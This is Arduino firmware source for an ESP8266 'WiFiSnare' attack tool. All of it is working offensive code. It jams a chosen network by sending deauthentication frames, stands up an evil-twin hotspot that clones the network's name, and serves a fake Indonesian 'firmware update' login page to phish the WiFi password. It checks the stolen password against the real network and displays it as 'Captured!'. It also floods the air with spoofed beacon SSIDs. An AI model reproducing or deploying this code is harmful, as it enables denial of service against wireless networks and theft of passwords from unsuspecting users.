/*
 * WiFiSnare + Beacon Spam Final Version
 * Logo: GMpro87 | Dev: 9u5M4n9
 * Optimized for Mobile - Clean SSID & Select Button
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

extern "C" {
  #include "user_interface.h"
}

DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
ESP8266WebServer webServer(80);
IPAddress subNetMask(255, 255, 255, 0);

const char *ssid = "GMpro";
const char *password = "Sangkur87";

unsigned long now = 0;
String tryPassword = "";
const int statusLED = 2;
uint8_t wifi_channel = 1;
String correctPassword = "";
bool hotspot_active = false;
unsigned long deauth_now = 0;
bool deauthing_active = false;

bool beacon_active = false;
unsigned long beacon_now = 0;
const char* beaconSSIDs[] = {"WIFI GRATIS", "Menghubungkan...", "Gangguan Sistem", "Virus terdeteksi", "CobaHackSaya"};

uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x07, 0x00
};

uint8_t beaconPacket[128] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00, 0x11, 0x00, 0x00 
};

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t encryption;
} networkDetails;

networkDetails networks[16];
networkDetails selectedNetwork;

int getRSSIasPercentage(int rssi) {
  if (rssi <= -100) return 0;
  if (rssi >= -50) return 100;
  return 2 * (rssi + 100);
}

void sendBeacon(const char* ssid_name) {
  int ssidLen = strlen(ssid_name);
  uint8_t packetLen = 38 + ssidLen;
  for(int i=10; i<22; i++) beaconPacket[i] = random(256);
  beaconPacket[37] = ssidLen;
  for(int i=0; i<ssidLen; i++) beaconPacket[38+i] = ssid_name[i];
  beaconPacket[38+ssidLen] = 0x01; 
  beaconPacket[39+ssidLen] = 0x08;
  beaconPacket[40+ssidLen] = 0x82;
  wifi_send_pkt_freedom(beaconPacket, packetLen + 6, 0);
}

void performScan() {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < 16; i++) networks[i] = networkDetails();
  if (n <= 0) return;
  int count = min(n, 16);
  for (int i = 0; i < count; ++i) {
    networks[i].ssid = WiFi.SSID(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].encryption = WiFi.encryptionType(i);
  }
}

String bytesToStr(const uint8_t* bytes, uint32_t size) {
  String result;
  for (uint32_t i = 0; i < size; ++i) {
    if (i > 0) result += ':';
    if (bytes[i] < 0x10) result += '0';
    result += String(bytes[i], HEX);
  }
  return result;
}

// UI ADMIN - MOBILE OPTIMIZED
void handleIndex() {
  if (webServer.hasArg("ap")) {
    String b = webServer.arg("ap");
    for (int i=0; i<16; i++) if (bytesToStr(networks[i].bssid, 6) == b) selectedNetwork = networks[i];
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("beacon")) beacon_active = (webServer.arg("beacon") == "start");
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "start");
    dnsServer.stop(); WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    WiFi.softAP(hotspot_active ? selectedNetwork.ssid.c_str() : ssid, hotspot_active ? NULL : password);
    dnsServer.start(53, "*", apIP);
    return;
  }

  if (hotspot_active) {
    if (webServer.hasArg("password")) {
      tryPassword = webServer.arg("password");
      WiFi.disconnect(); WiFi.begin(selectedNetwork.ssid.c_str(), tryPassword.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
      webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:sans-serif;text-align:center;padding-top:100px}.load{border:5px solid #f3f3f3;border-top:5px solid #0066ff;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:auto}@keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class='load'></div><p>Memproses...</p><script>setTimeout(function(){window.location.href='/result';},15000);</script></body></html>");
    } else {
      String victimSSID = String(selectedNetwork.ssid);
      webServer.send(200, "text/html", "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>Login</title><style>body{color:#333;font-family:sans-serif;margin:0;padding:0;background:#f4f4f4}nav{background:#0066ff;color:#fff;padding:15px;text-align:center;font-weight:bold;font-size:1.2em}div{padding:20px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:5px;box-sizing:border-box}</style></head><body><nav>" + victimSSID + "</nav><div><b>Pembaruan Sistem</b><br><br>Verifikasi kata sandi untuk melanjutkan firmware update.<form action='/' method='post'><input type='password' name='password' placeholder='Kata Sandi WiFi' minlength='8' required><input type='submit' value='Verifikasi' style='background:#0066ff;color:#fff;border:none;font-weight:bold;cursor:pointer;padding:12px;width:100%;border-radius:5px;'></form></div></body></html>");
    }
    return;
  }

  String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'><style>body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}h2{border:2px solid orange;padding:8px;display:inline-block;border-radius:6px;margin:10px 0}.dev{font-size:10px;color:#888;margin-bottom:15px}table{width:100%;border-collapse:collapse;font-size:12px}th,td{padding:10px 5px;border:1px solid #146dcc}th{background:rgba(20,109,204,0.3);color:orange} .btn-sel{background:#eb3489;color:#fff;border:none;padding:6px;border-radius:4px;width:100%;font-size:11px} .btn-ok{background:#FFC72C;color:#000;border:none;padding:6px;border-radius:4px;width:100%;font-weight:bold;font-size:11px} .ctrl{display:flex;justify-content:space-between;margin-top:20px} .cmd{flex:1;margin:0 4px;padding:12px 0;border:none;border-radius:4px;color:#fff;font-weight:bold;font-size:11px}hr{border:0;border-top:1px solid orange;margin:20px 0}</style></head><body><h2>GMpro87</h2><div class='dev'>dev : 9u5M4n9</div><table><tr><th>SSID</th><th>Ch</th><th>%</th><th>Aksi</th></tr>";
  for (int i=0; i<16 && networks[i].ssid != ""; i++) {
    String b = bytesToStr(networks[i].bssid, 6);
    bool s = (b == bytesToStr(selectedNetwork.bssid, 6));
    p += "<tr><td>" + networks[i].ssid + "</td><td>" + String(networks[i].ch) + "</td><td>" + String(getRSSIasPercentage(networks[i].rssi)) + "</td><td><form method='post' action='/?ap=" + b + "'><button class='" + String(s?"btn-ok":"btn-sel") + "'>" + (s?"Selected":"Select") + "</button></form></td></tr>";
  }
  p += "</table><hr><div class='ctrl'>";
  String dis = (selectedNetwork.ssid == "") ? "disabled" : "";
  p += "<form method='post' style='flex:1' action='/?deauth=" + String(deauthing_active?"stop":"start") + "'><button class='cmd' style='background:" + String(deauthing_active?"#f00":"#0c8") + "' " + dis + ">DEAUTH</button></form>";
  p += "<form method='post' style='flex:1' action='/?hotspot=" + String(hotspot_active?"stop":"start") + "'><button class='cmd' style='background:" + String(hotspot_active?"#f00":"#a53") + "' " + dis + ">EVILTWIN</button></form>";
  p += "<form method='post' style='flex:1' action='/?beacon=" + String(beacon_active?"stop":"start") + "'><button class='cmd' style='background:" + String(beacon_active?"#f00":"#60d") + "'>BEACON</button></form></div>";
  if(correctPassword != "") p += "<div style='margin-top:20px;border:1px dashed orange;padding:10px;'>" + correctPassword + "</div>";
  p += "</body></html>";
  webServer.send(200, "text/html", p);
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<script>alert('Gagal! Sandi Salah.');window.location.href='/';</script>");
  } else {
    correctPassword = "<b>Captured!</b><br>SSID: " + selectedNetwork.ssid + "<br>PASS: <span style='color:#0f0'>" + tryPassword + "</span>";
    hotspot_active = deauthing_active = beacon_active = false;
    dnsServer.stop(); WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask); WiFi.softAP(ssid, password);
    dnsServer.start(53, "*", apIP);
    webServer.send(200, "text/html", "<h2>Selesai!</h2><p>Data tersimpan.</p>");
  }
}

void setup() {
  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  pinMode(statusLED, OUTPUT); digitalWrite(statusLED, HIGH);
  WiFi.softAPConfig(apIP, apIP, subNetMask); WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleIndex); webServer.on("/admin", handleIndex); webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex); webServer.begin();
}

void loop() {
  dnsServer.processNextRequest(); webServer.handleClient();
  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(selectedNetwork.ch);
    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6); memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    deauthPacket[0] = 0xC0; wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauthPacket[0] = 0xA0; wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
  }
  if (beacon_active && millis() - beacon_now >= 100) {
    for(int i=0; i<5; i++) { wifi_set_channel(random(1, 12)); sendBeacon(beaconSSIDs[i]); }
    beacon_now = millis();
  }
  if (millis() - now >= 15000) { performScan(); now = millis(); }
}
